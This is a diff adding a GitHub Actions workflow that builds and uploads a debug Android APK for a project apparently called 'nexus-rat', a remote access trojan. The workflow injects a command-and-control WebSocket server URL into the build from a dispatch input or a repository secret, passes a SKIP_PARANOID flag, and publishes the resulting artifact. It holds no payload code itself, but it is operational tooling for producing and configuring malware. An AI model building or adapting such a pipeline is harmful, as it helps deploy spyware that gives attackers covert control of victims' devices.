@@ -1,1 +1,128 @@
+name: Build APK
 
+# ── Triggers ────────────────────────────────────────────────────────────────
+on:
+  push:
+    branches: [ main, master, develop ]
+    paths:
+      - 'android-rat/**'
+      - '.github/workflows/build.yml'
+  pull_request:
+    branches: [ main, master ]
+    paths:
+      - 'android-rat/**'
+      - '.github/workflows/build.yml'
+  workflow_dispatch:
+    inputs:
+      server_url:
+        description: 'C2 WebSocket URL (wss://...)'
+        required: false
+        default: 'wss://localhost:3000'
+
+# Cancel any in-progress run for the same branch/PR
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  build:
+    name: Debug Build
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    defaults:
+      run:
+        working-directory: android-rat
+
+    steps:
+      # ── 1. Checkout ──────────────────────────────────────────────────────
+      - name: Checkout source
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      # ── 2. JDK ───────────────────────────────────────────────────────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+          cache: gradle
+
+      # ── 3. Gradle wrapper permissions ────────────────────────────────────
+      - name: Make gradlew executable
+        run: chmod +x ./gradlew
+
+      # ── 4. Validate Gradle wrapper (security check) ───────────────────────
+      - name: Validate Gradle wrapper
+        uses: gradle/actions/wrapper-validation@v3
+
+      # ── 5. Gradle cache ──────────────────────────────────────────────────
+      - name: Cache Gradle packages
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: gradle-${{ runner.os }}-${{ hashFiles('android-rat/**/*.gradle*', 'android-rat/**/gradle-wrapper.properties') }}
+          restore-keys: |
+            gradle-${{ runner.os }}-
+
+      # ── 6. Inject SERVER_URL ─────────────────────────────────────────────
+      # Uses workflow_dispatch input if provided, otherwise SECRET, otherwise default
+      - name: Resolve SERVER_URL
+        id: server
+        run: |
+          URL="${{ github.event.inputs.server_url }}"
+          if [ -z "$URL" ]; then
+            URL="${{ secrets.SERVER_URL }}"
+          fi
+          if [ -z "$URL" ]; then
+            URL="wss://localhost:3000"
+          fi
+          echo "url=$URL" >> "$GITHUB_OUTPUT"
+
+      # ── 7. Build debug APK ────────────────────────────────────────────────
+      - name: Build debug APK
+        run: |
+          ./gradlew assembleDebug \
+            -PSERVER_URL="${{ steps.server.outputs.url }}" \
+            -PSKIP_PARANOID=true \
+            --no-daemon \
+            --stacktrace
+        env:
+          GRADLE_OPTS: "-Xmx4g -XX:+UseG1GC"
+
+      # ── 8. Capture APK path & metadata ───────────────────────────────────
+      - name: Locate APK
+        id: apk
+        run: |
+          APK=$(find app/build/outputs/apk/debug -name "*.apk" | head -1)
+          echo "path=$APK" >> "$GITHUB_OUTPUT"
+          SIZE=$(du -sh "$APK" | cut -f1)
+          echo "size=$SIZE" >> "$GITHUB_OUTPUT"
+          SHA256=$(sha256sum "$APK" | awk '{print $1}')
+          echo "sha256=$SHA256" >> "$GITHUB_OUTPUT"
+          echo "APK: $APK ($SIZE) — SHA256: $SHA256"
+
+      # ── 9. Upload artifact ────────────────────────────────────────────────
+      - name: Upload debug APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: nexus-rat-debug-${{ github.run_number }}
+          path: android-rat/${{ steps.apk.outputs.path }}
+          retention-days: 7
+          if-no-files-found: error
+
+      # ── 10. Build summary ────────────────────────────────────────────────
+      - name: Write build summary
+        if: always()
+        run: |
+          echo "## Build Summary" >> "$GITHUB_STEP_SUMMARY"
+          echo "| Field | Value |" >> "$GITHUB_STEP_SUMMARY"
+          echo "|---|---|" >> "$GITHUB_STEP_SUMMARY"
+          echo "| Branch | \`${{ github.ref_name }}\` |" >> "$GITHUB_STEP_SUMMARY"
+          echo "| Commit | \`${{ github.sha }}\` |" >> "$GITHUB_STEP_SUMMARY"
+          echo "| Server URL | \`${{ steps.server.outputs.url }}\` |" >> "$GITHUB_STEP_SUMMARY"
+          echo "| APK Size | ${{ steps.apk.outputs.size }} |" >> "$GITHUB_STEP_SUMMARY"
+          echo "| SHA-256 | \`${{ steps.apk.outputs.sha256 }}\` |" >> "$GITHUB_STEP_SUMMARY"
